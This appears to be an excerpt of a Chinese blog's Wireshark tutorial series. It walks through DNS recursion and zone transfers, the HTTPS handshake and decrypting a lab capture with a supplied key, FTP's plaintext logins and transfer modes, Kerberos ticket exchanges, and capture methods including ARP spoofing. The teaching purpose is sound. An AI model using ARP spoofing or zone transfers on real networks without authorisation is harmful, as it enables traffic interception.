<p><img src="/2017/03/28/不可或缺的DNS协议/3.jpg" alt="3"><br>这个数据包是对第一个数据包的回应，从标识码的值也可以知道它与第一个数据包是对应的。在 Flags区段可以看到这是一个响应数据包，并且允许必要的递归。接下来的Questions以及Answer RRs的值都是1，说明接下来的区段会包含一个询问和一个回答。询问的内容与上一个数据包一致，回答的内容就是对询问的问题做一个回应。也就是回复了wireshark.org的IP地址是128.121.50.122。客户计算机获取了这个回应信息，就可以开始构建IP数据包，并与wireshark.org进行通信了。  </p>
<p>##DNS递归数据包分析<br>这里我们研究一下DNS的递归数据包。实验文件Lab13-2.pcap是从客户端捕获的两个DNS数据包：<br><img src="/2017/03/28/不可或缺的DNS协议/4.jpg" alt="4"><br>首先，第一个数据包是从客户端172.16.0.8发往DNS服务器172.16.0.102的初始查询。展开这个数据包的DNS区段，可以发现这是一条用于查找域名为www.nostarch.com的标准查询，并且在Flags区段中还看到了期望递归的标志。</p>
<p>第二个数据包是我们所期望看到的对于初始数据包的响应：<br><img src="/2017/03/28/不可或缺的DNS协议/5.jpg" alt="5"><br>这个数据包的事务ID和我们前一个数据包相匹配，并且在Answers区段得到了www.nostarch.com所对应IP地址。</p>
<p>仅仅在客户计算机进行抓包分析，我们只能知道成功获取了IP地址，并不知道这个IP地址的查询过程是否进行了递归的操作。因此这里我们需要研究一下在服务器端获取的实验文件Lab13-3.pcap。这个文件包含有在查询开始时，在本地DNS服务器上捕获到的数据包。这里的第一个数据包和我们之前捕获文件中的初始查询相同。</p>
<p>此时，DNS服务器接收到了这个查询数据包，检索本地数据库之后，发现自己并不知道关于所查询域名的IP地址。由于这个数据包被设置了期望递归，那么我们在第二个数据包中就可以看到这个DNS服务器为了获取IP地址，于是就向其它的DNS服务器进行查询：<br><img src="/2017/03/28/不可或缺的DNS协议/6.jpg" alt="6"><br>在这个数据包中，位于172.16.0.102的DNS服务器向位于4.2.2.1的DNS服务器发起了查询请求，这个服务器就是本地DNS服务器所设定的要转发上行请求的服务器。这个请求其实是原始请求的镜像，此时其自身相当于一个DNS客户端。 由于这个事务ID与之前捕获文件中的事务ID不同，所以我们可以将这个DNS查询作为一个新的查询。这个数据包被4.2.2.1服务器接收以后，本地DNS服务器就收到了回应，也就是第三个数据包的内容：<br><img src="/2017/03/28/不可或缺的DNS协议/7.jpg" alt="7"><br>接收到了这个响应之后，本地DNS服务器就将IP地址传递给了发起DNS请求的客户端。虽然这里只展示了一层递归，但事实上，对于一个DNS请求来说，可能会出现多次递归的情况。在这个例子中，我们是从4.2.2.1服务器中获取IP地址的，但是那个服务器可能为了寻求答案也向其它的服务器执行了递归查询的操作。一个简单的查询在得到最终结果之前，可能会游历全世界。  </p>
<p>##DNS区域传送分析<br>DNS区域是一个DNS服务器所授权管理的名字空间（或是一组DNS名称）。举个例子来说，ichunqiu这个网站可能由一个DNS服务器对ichunqiu.com负责。这样，不论是ichunqiu内部还是外部的设备，如果希望将ichunqiu.com解析成IP地址，都需要和这个域的DNS服务器联系。现在ichunqiu又多了一个社区功能，那么它可能会增加一个DNS服务器，专门用来处理其名字空间中的bbs部分，比如bbs.ichunqiu.com。那么这个服务器，就成为了这个社区子区域的权威。如果有必要的话，还可以为子域名添加更多的DNS服务器，如下图所示：<br><img src="/2017/03/28/不可或缺的DNS协议/8.jpg" alt="8"><br>区域传送指的是出于冗余备份的需要，在两台设备之间传送区域数据。比如在拥有多个DNS服务器的组织中，管理员通常都会配置一台备用DNS服务器，用于维护一份主服务器的DNS信息拷贝，以防止主DNS服务器不可用的情况出现。但如果配置不当，就会导致任何匿名用户都可以获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露，从而造成严重的信息泄露，甚至导致企业网络被渗透。区域传送主要包含有两种形式：</p>
<p>1、完整区域传送（AXFR）</p>
<p>这个类型的传送将整个区域在设备间进行传送。</p>
<p>2、增量区域传送（IXFR）</p>
<p>这个类型的传送仅仅传送区域信息的一部分。</p>
<p>实验文件Lab13-4.pcap就包含有一个区域传送的例子。首先我们会发现，数据包的类型是TCP而不是UDP。而我们之前也说了，DNS是基于UDP协议的，但事实上，DNS在如同区域传送这样的一些任务中，会使用TCP协议，因为TCP对于规模化的数据传输更为有效。那么很明显，这个捕获文件中的前三个数据包其实就是TCP的三次握手。</p>
<p>接下来的第四个数据包就开始在172.16.16.164和172.16.16.139之间进行实际的区域传送了。需要注意的是，这个数据包里面并不包含任何DNS信息。而这个数据包被标记为“TCP segment of a reassembled PUD”，即“重组PUD的TCP分片”。第五个数据包是对于第四个数据包成功接收的确认。而第六个数据包则可以作为完整的DNS区域传送请求的参考：<br><img src="/2017/03/28/不可或缺的DNS协议/9.jpg" alt="9"><br>在这里可以看到，区域传送是典型的查询，并且请求的是AXFR类型，也就是完整区域传送，意味着它希望从服务器接收全部DNS区域。接下来服务器在第七个数据包中回复了区域记录：</p>
<p>可见，区域传送包含了相当多的数据。如果是复杂的网络情况，还会包含有更多的数据，这就彰显了保证区域传送安全的重要性。在传送完毕之后，捕获文件以TCP的连接终止作为结束。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[为安全而生的HTTPS协议]]></title>
        <url>https://517736522.github.io/2017/03/28/%E4%B8%BA%E5%AE%89%E5%85%A8%E8%80%8C%E7%94%9F%E7%9A%84HTTPS%E5%8D%8F%E8%AE%AE/</url>
        <content type="html"><![CDATA[<p>##HTTPS的工作流程<br>使用HTTPS协议工作时，服务端和客户端的信息传输都会进行加密，所以传输的数据都是加密后的数据。HTTPS的工作流程如下：<br><img src="/2017/03/28/为安全而生的HTTPS协议/1.jpg" alt="1"><br>1、客户端使用HTTPS的URL访问Web服务器，要求与Web服务器建立SSL连接。</p>
<p>2、Web服务器收到客户端的请求后，会将网站包含有公钥的证书信息传送一份给客户端。</p>
<p>3、客户端浏览器与Web服务器开始协商SSL连接的安全等级，也就是信息加密的等级。</p>
<p>4、客户端的浏览器根据双方同意的安全等级，建立会话密钥，然后利用网站的公钥将会话密钥加密，并传送给网站。</p>
<p>5、Web服务器利用自己的私钥解密出会话密钥。</p>
<p>6、Web服务器利用会话密钥加密与客户端之间的通信。  </p>
<p>##HTTPS数据包的捕获<br>由于HTTPS是建立在TCP协议之上的，所以我们在捕获之前，可以设置筛选器为TCP。开始捕获后，可以通过登录QQ邮箱的方式，捕获到含有HTTPS协议的数据包。如下图所示（Lab15-1.pcapng）：<br><img src="/2017/03/28/为安全而生的HTTPS协议/2.jpg" alt="2"><br>在这个界面的Info列中，可以看到这些数据包都是使用HTTPS协议传输的。而在Protocol列中，可以看到SSL、TCP以及TLSv1.1等协议。其中的TLS（Transport Layer Security）其实是SSL的升级版，是为网络通信提供安全及数据完整性的一种安全协议。二者都是在传输层对网络连接进行加密的。</p>
<p>为了便于进一步的分析，这里我们依旧可以采用前几次课中说过的，通过着色后提取数据包的方式，将我们需要的数据包提取出来，这里不再赘述。  </p>
<p>##HTTPS数据包的分析<br>这里我们打开Lab15-1-https.pcapng这个实验文件，也就是经过提取后的文件进行分析：<br><img src="/2017/03/28/为安全而生的HTTPS协议/3.jpg" alt="3"><br>首先可以发现1到3号数据包是TCP连接建立时的三次握手的过程。接下来从第4个数据包开始，其实就是SSL握手过程中所产生的数据包，也就是使用HTTPS协议加密的信息。</p>
<p>对于第4个数据包，包含有客户端向服务器发送的Client Hello信息，以便开始一个新的加密会话连接。展开SSL区段，可以看到客户端支持的TLS的版本（Version）；生成的随机数（Random，以便用于生成对话密钥）；Cipher Suites的值是15，说明支持15种加密算法；支持的压缩方式（Compression）以及一些扩展（Extension）等：<br><img src="/2017/03/28/为安全而生的HTTPS协议/4.jpg" alt="4"><br>当服务器收到客户端的请求后，就会向客户端发出响应，也就是Server Hello。对于我们这个捕获文件而言，第6个数据包就是服务器发送给客户端的确认信息，告诉客户端请求已经收到：<br><img src="/2017/03/28/为安全而生的HTTPS协议/5.jpg" alt="5"><br>展开SSL数据段，可以看到服务器支持的TLS版本为1.1。也可以看到服务器生成的随机数，用于生成对话密钥。下面还有加密套件信息，这里的加密套件表示使用RSA公钥算法来验证证书以及交换密钥，用AES加密算法对数据进行加密，使用SHA算法来校验消息内容。</p>
<p>客户端收到服务器的响应后，首先验证服务器的证书。如果证书不是由可信任的机构颁发的，或者证书中的域名与实际域名不一致，或者证书已过期，就会向访问者显示一个警告，由访问者选择是否还要继续通信。如果证书没有问题，客户端就会从证书中取出服务器的公钥。然后，向服务器发送一些信息，包括用服务器公钥加密的随机数、编码改变通知和客户端握手结束通知等。服务器发送给客户端的数据包，如下图所示：<br><img src="/2017/03/28/为安全而生的HTTPS协议/6.jpg" alt="6"><br>在Certificate区段中，保存有证书的详细信息。可以看到请求的网站、组织名、地区名、省名以及国家等的信息。紧接下来的signedCertificate是签名证书信息。“签名”的作用就在于，客户端（浏览器）在确定是否要信任一个网站时，就是通过证书判断的。所以每个证书上必须要有一份“签名”。最后一行Length的值为0，表示告诉客户端“Hello”过程已经完成，也就意味着服务器将不验证客户端的证书。</p>
<p>在客户端收到并验证服务器响应的证书后，将会把生成的密钥传给服务器，如下图所示：<br><img src="/2017/03/28/为安全而生的HTTPS协议/7.jpg" alt="7"><br>在Client Key Exchange中，我们可以看到TLS的类型、版本、长度、握手协议、握手类型、长度、密钥交换算法客户端参数、公钥长度以及加密公钥等信息。而在其它的两个记录中，也有着类似的结构。</p>
<p>经过以上几个阶段，整个握手过程也就结束了。接下来客户端与服务器进入加密通信的阶段，就完全是使用普通的HTTP协议，但是会使用会话密钥来加密内容。用户可以发送通过TLS层使用RC4加密的HTTP的消息，也可以解密服务端发送来的由RC4加密的消息。此外还会通过哈希算法来验证消息是否被篡改。</p>
<p>在应用层，客户端向服务器发送的信息为：<br><img src="/2017/03/28/为安全而生的HTTPS协议/8.jpg" alt="8"><br>可见，发送的数据都经过了加密处理。服务器响应客户端的信息，如下图所示：<br><img src="/2017/03/28/为安全而生的HTTPS协议/9.jpg" alt="9"><br>可以看到，这也是使用了SSL进行加密。  </p>
<p>##HTTPS数据包的解密<br>HTTPS的数据包并不是绝对安全的，在一定的条件下也可以实现解密的操作，这里我们打开Lab15-2.cap实验文件：<br><img src="/2017/03/28/为安全而生的HTTPS协议/10.jpg" alt="10"><br>可以看到，这里的数据包使用了SSLv3进行加密。为了实现解密，我们需要Lab15-2.key文件。为了便于寻找，这里我将这个文件放在了我的电脑中的C盘根目录下。之后在Wireshark中选择菜单栏的“Edit”-&gt;”Preferences”-&gt;”Protocols”-&gt;”SSL”-&gt;”RSA keys list”-&gt;”Edit”-&gt;”New”，之后进行如下填写：<br><img src="/2017/03/28/为安全而生的HTTPS协议/11.jpg" alt="11"><br>之后点击OK，就可以实现解码了：<br><img src="/2017/03/28/为安全而生的HTTPS协议/12.jpg" alt="12"><br>现在已经可以看到GET方法等信息。尽管我们对捕获文件进行了解码操作，但是并不意味着HTTPS不安全。因为解码所需要使用的密钥只能在服务器导出，不同的服务器的情况并不一样，因此想要破解HTTPS的数据包，是需要满足很多的条件的。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[协议中的活化石-FTP]]></title>
        <url>https://517736522.github.io/2017/03/28/%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E6%B4%BB%E5%8C%96%E7%9F%B3-FTP/</url>
        <content type="html"><![CDATA[<p>##FTP的工作流程<br>FTP的工作流程如下图所示：<br><img src="/2017/03/28/协议中的活化石-FTP/1.jpg" alt="1"><br>图中的客户端是希望从服务器端下载或上传文件的计算机。服务器端是提供FTP服务的计算机，它监听某一端口的TCP连接请求。而TCP服务一般运行在20和21两个端口。其中的端口20用于在客户端和服务器之间传输数据流，而端口21用于传输控制流，是FTP命令通向FTP服务器的入口。控制连接和数据连接都是TCP连接，控制连接用于传送用户名、密码及设置传输方式等控制信息，数据连接用于传输文件数据。客户端和服务器端分别运行着控制进程和数据传送进程。</p>
<p>当用户需要从服务器下载文件时，可以通过客户界面让客户端的控制进程发起一个TCP连接请求。服务器端的控制进程接受了该请求之后，建立了控制连接。于是，双方就可以相互传递控制信息了，但此时双方还不能传输文件数据。为了传输数据，双方的数据传送进程还需要再建立一个数据连接。</p>
<p>当客户端向服务器端发出建立TCP控制连接请求时，使用的服务器端的默认端口号是21，同时要告诉服务器端一个空闲的端口号，用于以后建立数据传输连接。然后，服务器端使用默认的20号端口与客户端所提供的端口建立数据传送连接，然后开始数据的传输。</p>
<p>一般情况下，控制连接是一直存在的，但数据连接在一个文件传输完毕之后就会断开。如果还需要传输另一个文件，则需要重新建立数据连接。这个特性使得FTP在传输大量的小文件时效率比较低，因为每一个文件传输时都需要建立和关闭TCP连接。这样会消耗一定的时间。</p>
<p>FTP的工作模式和其它网络通信协议有很大的区别。通常在使用HTTP等协议进行通信时，通信双方只用一个通信端口进行通信，即只有一个连接。而FTP使用两个独立的连接，其主要优点是使网络数据传输分工更加明确，同时在文件传输的时候还可以利用控制连接传送控制信息。  </p>
<p>##FTP数据包分析<br>了解了关于FTP的基础知识，那么下面我们就可以尝试分析FTP的数据包了，看看基于FTP协议的数据包在Wireshark中的表现。实验文件Lab16-1.cap记录了一次利用Windows客户端登录FTP服务器，并且下载了一个文件的过程：<br><img src="/2017/03/28/协议中的活化石-FTP/2.jpg" alt="2"><br>这个捕获文件中的前三个数据包是由客户端发起的TCP的三次握手，并且在第2个数据包中我们也可以发现，FTP服务器的控制端口21。</p>
<p>接下来我们详细分析一下FTP的数据包，也就是5、7、8、10以及11号数据包。可以点击一下Protocol列，使其以协议名称进行排序：<br><img src="/2017/03/28/协议中的活化石-FTP/3.jpg" alt="3"><br>可以看到其中的5号数据包是服务器端发往客户端的，说明服务器端已经做好了准备，并包含了自己的一些信息。7号数据包是由客户端发出的，请求以一个用户名进行登录。8号数据包是对7号的回应，服务端要求客户端提供与登录用户名相对应的登录密码。于是客户端在第10号数据包中，将密码发送给了服务器端。经过服务器的验证，用户名和密码没有问题后，利用第11号数据包回复客户端登陆成功。</p>
<p>由上述的一系列分析可见，FTP是使用明文进行传输的，用户名和密码都可以在Wireshark中看到，如果对于安全的要求非常高，那么就不可以采用这样的方式。</p>
<p>接下来分析一下下载过程的数据包。第13号数据包是客户端发送的请求，说明客户端想从IP地址为10.32.200.41，端口号为208*256+185=53433连接对方的数据端口，注意这里的256是约定好的常数。那么接下来的14号数据包则是对此的回应，说明服务器已经同意了请求。接下来的15号数据包，客户端要求服务器传输文件，而22号数据包则回应文件已经传送了。</p>
<p>但是这些FTP数据包并没有真正实现文件的传送。所以这里我们可以关注一下16到24号数据包的情况：<br><img src="/2017/03/28/协议中的活化石-FTP/4.jpg" alt="4"><br>可以看到，在客户端要求服务器端传送文件之后，从第16号数据包开始，是TCP的三次握手，不过这次是FTP服务器发起的握手，服务器的端口号是20，正是数据传输端口，而客户端的端口号就是之前协商得到的53433号端口。接下来的19号数据包，所传送的就是文件的内容。当然这里所传输的是一个非常简单的文件，如果捕获到了一个较为复杂的文件，我们通过分析其二进制码的特征，就可以知道该文件的类型了。然后将该二进制码读取出来，并以相应的后缀名保存，就可以打开了。之后的20、21、23、24号数据包，则是TCP连接结束的四次握手的过程，表示数据传输结束，TCP连接也就关闭了。  </p>
<p>##配置了防火请的FTP数据包分析<br>我们刚才所分析的是正常情况下，FTP数据包的情况。但是现实中，出于网络安全的考虑，我们可能会为FTP配置防火墙。但是这种方式会带来一个严重的问题，由于数据传输连接的三次TCP握手是由服务器主动发起的，也就是主动模式，那么如果客户端的防火墙阻挡了连接请求，那么很可能导致传输的失败。所以在这种情况下，我们应当使用FTP的被动模式。被动模式可以在所使用的FTP客户端进行设置。实验文件Lab16-2.cap是在FTP的被动模式下获取的文件：<br><img src="/2017/03/28/协议中的活化石-FTP/5.jpg" alt="5"><br>这里我们同样先分析一下FTP数据包。由于被动模式和主动模式的登陆过程是完全一样的，因此这里只着重分析登陆后的情况，也就是从第24号数据包开始。这个数据包中，客户端要求以被动方式传输数据。接下来服务器回应说，可以连接到IP地址为10.32.106.112，端口号为240*256+217=61657。注意如果是主动模式，IP地址以及端口号是由客户端发给服务器的。之后的第29号数据包，客户端提出了文件下载的请求，之后服务器通过30号数据包说明文件即将传输。接下来看一下26到35号数据包：<br><img src="/2017/03/28/协议中的活化石-FTP/6.jpg" alt="6"><br>26、27和28号数据包是TCP连接的三次握手，这个连接由客户端主动发起，那么相对于服务器来说就是被动的。连接的服务器端口是之前商定好的61657。之后的31号数据包完成了数据的传输，从32号开始的四个数据包则是TCP断开的四次握手。接着看一下39至44号的数据包：<br><img src="/2017/03/28/协议中的活化石-FTP/7.jpg" alt="7"><br>当我们想退出的时候，可以在FTP的命令行中输入bye，那么在Wireshark中的显示就是，第39号数据包，也即是客户端要求退出，之后服务端很有礼貌地回应Goodbye。然后再通过TCP的四次握手断开控制连接，就完成了一次FTP的活动周期。  </p>
<p>##Windows上的小bug<br>理论上，所有的FTP客户端都应当支持主动和被动两种模式，但是Windows自带的FTP命令却只支持主动模式。为什么这么说呢，比如我们在Windows的FTP命令行中首先利用quote pasv进入被动模式，之后进行数据传输，来分析一下此时获取的数据包（Lab16-3.cap）：<br><img src="/2017/03/28/协议中的活化石-FTP/8.jpg" alt="8"><br>可以看到，12号数据包说明客户端要求进入被动模式，而13号数据包中，服务端也同意了客户端的请求，并且给出了IP地址以及端口号。那么按理说就应当进入被动模式了，但是接下来数据包的传输方式却依旧按照主动传输进行的。因为接下来的第15号数据包，客户端又给出了一个IP地址以及端口，而接下来的数据传输就是依据这个端口和IP地址进行的。包括TCP的三次握手也是由服务器主动发起的。也就是说，在Windows自带的FTP中，尽管选择了被动模式，但是数据的传输方式却是依照主动模式的，那么可以认为Windows自带的FTP只有主动模式。因此可以认为这是Windows系统上的一个bug。  </p>
<p>##小结<br>由此可见，Wireshark拥有非常强大的网络分析功能，不单单可以进行网络协议分析，甚至还可以找到系统中的bug。当然想要找到关于网络的bug，其基础还是建立在熟悉网络协议上，只有对网络协议了然于胸，才有可能发现网络中的问题，而我们以后的排错篇及安全篇，就需要这些基础的协议知识，因此希望大家能够认认真真地学好这些协议。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[固若金汤的Kerberos]]></title>
        <url>https://517736522.github.io/2017/03/28/%E5%9B%BA%E8%8B%A5%E9%87%91%E6%B1%A4%E7%9A%84Kerberos/</url>
        <content type="html"><![CDATA[<p>##Kerberos的实现原理<br>那么这个Kerberos是什么意思呢？相信看过希腊神话或者《圣斗士-冥王篇》的朋友应该都知道，在渡过了冥河之后，冥界的大门由一只巨大的三头猎犬所看守，保证冥界的大门只许进不许出，令冥界之门固若金汤。而这只猎犬的名字就是Kerberos，应用于我们所讲的网络认证中，表示这是安全的象征。</p>
<p>在实际的网络应用中，Kerberos的认证结果是双向的，也就是当帐号A访问资源B的时候，不但B要确保A并非冒充，而且A也要查明B的真实身份。而双向认证的方式并不止一种，最简单的方式就是互报接头暗号。如果大家看过《林海雪原》，就会知道当时杨子荣深入虎穴，在面对土匪时，土匪说“天王盖地虎”，杨子荣回复到”宝塔镇河妖” ……那么其实这就是密码技术在现实中的应用，也正是因为杨子荣对上了暗号，才会让土匪相信了他是自己人。但是这种方式的弊端有很多，最大的问题是管理起来不方便。比如在一个数百名员工共享几百台机器的环境中，当加入一名新员工时，就需要在几百台的机器上更新帐号信息。那么这对于网络管理员来说是无法容忍的。</p>
<p>为了解决这个问题，Kerberos引入了一个权威的第三方来专门负责身份的认证工作。这个第三方就称之为KDC，他知道所有的账号和密码。这样一来，假如账号A想要访问资源B，那么利用KDC就可以验证双方的身份了。因此，A和B都不需要知道对方的密码，可以完全依赖于KDC。</p>
<p>Kerberos的原理说起来简单，但是通过程序来实现还是比较困难的。包括想要彻底理解它的验证流程，如果仅仅通过文字说明，学起来还是有难度的。但是如果利用Wireshark进行分析，就可以使得Kerberos的验证流程变得清晰很多。整个验证流程可以分为三大步骤，下面我们结合实验文件Lab17-1.pcap逐一进行分析。<br>第一步，账号A和KDC互相认证。</p>
<p>1、账号A利用哈希函数将密码转化成一把密钥，这里称它为Key-Client。</p>
<p>2、利用Key-Client将当前的时间戳加密，生成一个字符串。表示为“{时间戳} Key-Client”。</p>
<p>3、将上一步生成的字符串“{时间戳} Key-Client”、账号A的信息以及一段随机字符串发给KDC。这样就组成了Kerberos的身份认证请求AS-REQ，可以使用下面的公式来表示：</p>
<p>AS-REQ=“{时间戳} Key-Client”+“账号A的信息”+“随机字符串”。</p>
<p>如下图所示：<br><img src="/2017/03/28/固若金汤的Kerberos/1.jpg" alt="1"><br>这里需要注意的是，当前捕获文件中的数据是处于加密状态的，这不利于我们的分析。不过只要知道密码，就可以生成解密文件，这里也给大家提供了名为Lab17-1.keytab的解密文件，我们可以在菜单栏中选择“Edit”-&gt;”Preferences”-&gt;”Protocols”-&gt;”KRB5”，之后勾选两个选项，并输入解密文件的名称，之后就可以看到解密后的内容了。但是这个功能只能够支持32位的Wireshark，64位的还不支持。并且解密文件的路径最好不要有中文，放在C盘根目录下即可。之后再次查看第一个数据包的内容：<br><img src="/2017/03/28/固若金汤的Kerberos/2.jpg" alt="2"><br>上图中的KerberosString后面的内容就是账号A的信息，而nonce后面的内容就是随机字符串。</p>
<p>4、KDC收到AS-REQ之后，读取到A的信息，就可以调出A的密码，再使用同样的哈希函数将其转化为Key-Client。有了Key-Client就可以解开“{时间戳} Key-Client”了。如果能够成功解开，就说明这个请求是由账号A生成的，毕竟其它账号不可能有Key-Client进行加密。</p>
<p>Kerberos之所以使用时间戳进行加密，原因就在于如果黑客在网络上截获了字符串“{时间戳} Key-Client”，那么就有可能伪装成账户A来欺骗认证。这种方式就称为重放攻击。采用这种攻击方式需要一定的时间，所以KDC把解密得到的时间戳和当前的时间作对比，如果二者的差异过大，那么就可以认为遭受到了重放攻击。假如采用与时间无关的字符进行加密，那么是无法避开重放攻击的，因此这就要求域中的所有计算机要在时间上同步。其实这种计算前后时间差的思想往往也会应用于反调试技术中，有兴趣的朋友可以关注《恶意代码分析实战》系列的课程。</p>
<p>5、接下来，KDC需要向账号A证明自己的身份，刚才提到的随机字符串就需要用在这里。理论上KDC只要使用Key-Client加密随机字符串，再回复给账号A就可以证明自己的身份了。因为假的KDC是没有Key-Client的，那么账户A收到假的KDC的回复后，解不开那个随机字符串，就知道KDC是假的。</p>
<p>总结上面的流程，账号A和KDC都没有向对方发送密码，所以即便有一方是假的也不会导致信息的泄露。如果双方都是真的，则可以实现相互认证的过程。但是这个机制中的KDC是非常忙碌的，因为每次的认证都需要调出密码账号、进行哈希运算、实现解密操作……每个客户端一天可能会验证数十次，那么域中就需要配置大量的KDC才能够负担得起，因此改进流程就显得很有必要了。Kerberos在这里设计了一个比较巧妙的方法：</p>
<p>a.KDC生成两把一模一样的密钥Key-Client-KDC，用于以后账户A和KDC之间相互的认证，这样就省去了调出账号A的密码和哈希等的工作。按理说其中的一把Key-Client-KDC应当由账户A保管，另一把由KDC自己保管。但是KDC本来就很忙碌，额外再保管密钥会加重自身的负担，因此这个密钥就委托给账户A来保管，那么以后账户A需要KDC的时候，再把这个密钥还回来就可以了。但是这里面有一个问题，那就是如果有个假冒的账户A交回来一个假的密钥怎么办？为了避免这个问题，KDC把自己的密码哈希成Key-KDC，然后用它加密那把委托给账户A的密钥。Kerberos将这个密钥称为TGT（Ticket Granting Ticket），可以用以下公式表示：</p>
<p>TGT={账户A的相关信息，Key-Client-KDC} Key-KDC</p>
<p>有了这个委托保管的机制，那么KDC只需要记住自己的Key-KDC，就可以解开委托给所有账号的TGT，从而获得与该帐号之间的密钥。通过这个机制，KDC的工作负担就大大降低了。那么总结以上可以知道，KDC回复给账户A的AS-REP应当包括以下信息：</p>
<p>AS-REP=TGT，{ Key-Client-KDC，时间戳，随机字符串} Key-Client</p>
<p>那么相对应的，就是捕获文件中2号数据包的内容：<br><img src="/2017/03/28/固若金汤的Kerberos/3.jpg" alt="3"><br>这其中的ticket就是TGT，下面的key表示的是Key-Client-KDC，Lr-time是时间戳，nonce是随机字符串，它与第一个数据包中的字符串是一致的。</p>
<p>b. 账户A收到AS-REP之后，利用Key-Client解密“{ Key-Client-KDC，时间戳，随机字符串} Key-Client”，通过解密得到的随机字符串和时间戳来确定KDC的真实性，然后把Key-Client-KDC和TGT保存起来备用。<br>第二步，账号A请KDC帮忙认证资源B。</p>
<p>1、现在应当把TGT交还给KDC，其次还有账户A的相关信息、当前时间戳以及要访问的资源B的信息。这个请求在Kerberos中被称为TGS-REQ，可以使用以下公式表示：</p>
<p>TGS-REQ=TGT，{账户A的相关信息，时间戳} Key-Client-KDC，“资源B的相关信息”</p>
<p>如下图所示：<br><img src="/2017/03/28/固若金汤的Kerberos/4.jpg" alt="4"><br>图中的ticket是要交还给KDC的TGT，下面的KerberosString表示A的帐号信息，ctime是时间戳，最后的两个KerberosString表示资源B的信息。</p>
<p>2、KDC收到TGS-REQ之后，先使用Key-KDC解密TGT得到Key-Client-KDC，再使用Key-Client-KDC解密出账号A的相关信息和时间戳来验证其身份。一旦认定账号A为真，那么接下来就要帮助A和B进行相互认证了。</p>
<p>3、KDC生成两把同样的密钥供A和B之间使用，我们就称这个密钥为Key-Client-Server。其中一把密钥直接交给账号A，另一把委托A转交给资源B。为了确保A不会受到假的资源B所骗，Kerberos把B的密码哈希成Key-Server，然后用它加密那把委托A转交给B的Key-Client-Server，成为一个只有真正的B才能够解密的ticket。总结以上，KDC给账号A的回复可以表示为：</p>
<p>Ticket={账号A的信息，Key-Client-Server} Key-Server</p>
<p>TGS-REP={ Key-Client-Server} Key-Client-KDC，ticket</p>
<p>这里的“账号A的信息”不单单包括A的名称，还包括A所在的域组（Domain Groups）。因此如果A属于很多个组（Groups），那么TGS-REP数据包就会很大。如下图所示：<br><img src="/2017/03/28/固若金汤的Kerberos/5.jpg" alt="5"><br>上图中的ticket就是“{账号A的信息，Key-Client-Server} Key-Server”，cipher后面的内容就是“{ Key-Client-Server} Key-Client-KDC”，下面的keyvalue的值就是Key-Client-Server。</p>
<p>4、账号A收到TGS-REP之后，首先使用Key-Client-KDC解开{ Key-Client-Server} Key-Client-KDC，从而得到Key-Client-Server。Ticket留下来发给资源B。接下来如果需要多次访问资源B，都可以使用同一个ticket，而不需要每次都向KDC申请，这就降低了KDC的负担。<br>第三步，账号A和资源B互相认证。</p>
<p>1、这时候，账号A给资源B发送“{账号A的信息，时间戳} Key-Client-Server”以及之前收到的ticket，这个请求称为AP-REQ：</p>
<p>AP-REQ=“{账号A的信息，时间戳} Key-Client-Server”，ticket</p>
<p>如下图所示：<br><img src="/2017/03/28/固若金汤的Kerberos/6.jpg" alt="6"><br>2、如果资源B是假的，那么它就解不开ticket。如果资源B是真的，它可以用自己的密码生成Key-Server来解开ticket，从而得到Key-Client-Server。有了Key-Client-Server就可以解开“{账号A的信息，时间戳} Key-Client-Server”部分。这样资源B就可以确定账号A为真，然后回复AP-REP来证明自己也是真的：</p>
<p>AP-REP={时间戳} Key-Client-Server</p>
<p>3、账号A利用Key-Client-Server来解密AP-REP，再通过得到的时间戳来判断对方是否为真。如下图所示：<br><img src="/2017/03/28/固若金汤的Kerberos/7.jpg" alt="7">  </p>
<p>##小结<br>Kerberos是一个比较复杂的协议了，希望大家能够多看几遍这次的课程，真正掌握 Kerberos的原理和分析方法，那么相信就没有协议能够难倒大家了。   </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[因配置错误而导致的网络故障]]></title>
        <url>https://517736522.github.io/2017/03/28/%E5%9B%A0%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E8%80%8C%E5%AF%BC%E8%87%B4%E7%9A%84%E7%BD%91%E7%BB%9C%E6%95%85%E9%9A%9C/</url>
        <content type="html"><![CDATA[<p>##Wireshark部署概述<br>我们之前的研究，都是在本机上利用Wireshark进行抓包分析的。但是在现实的网络环境中，由于计算机众多，那么在故障定位时究竟应当采用哪种手段如何部署Wireshark进行抓包分析，往往是能否顺利解决问题的关键。作为网络数据包分析师，我们需要让自己的捕获尽量隐秘，以最大限度地捕获到最为原始的数据包。仅仅采集我们所需要的数据，而不留下任何的痕迹。下图展示了数据包捕获的常用方法，大家在实际的分析过程中可以拿来参考：<br><img src="/2017/03/28/因配置错误而导致的网络故障/1.jpg" alt="1"><br>上图只是一个简单的通用参考，并不涵盖所有用来监听网络线路的可能方法。对于每种方法的概述如下：</p>
<p>1、端口镜像：通常是首选的方法，因为它不会留下网络痕迹，也不会因此而产生额外的数据包。可以在不让客户端脱机下线的情况下进行配置，非常便于镜像路由器或者服务器端口。</p>
<p>2、ARP欺骗：也称为ARP缓存中毒。这种方式会被认为比较草率，因为这种方法涉及在网络上注入数据包，这就会加重路由流经嗅探器的网络流量，但是这会有助于我们的分析。如果需要一个暂时性快速实施的方法，能够将一个设备的网络流量进行捕获，而又不用将其下线，同时端口镜像又不被支持的时候，这种方法就是一个高效的选择。</p>
<p>3、集线器输出：如果不需要考虑主机暂时下线带来的后果，那么可以采用这种方法。但是如果需要捕获多台主机的流量时，效率会很低，因为碰撞和丢包会导致性能低下。</p>
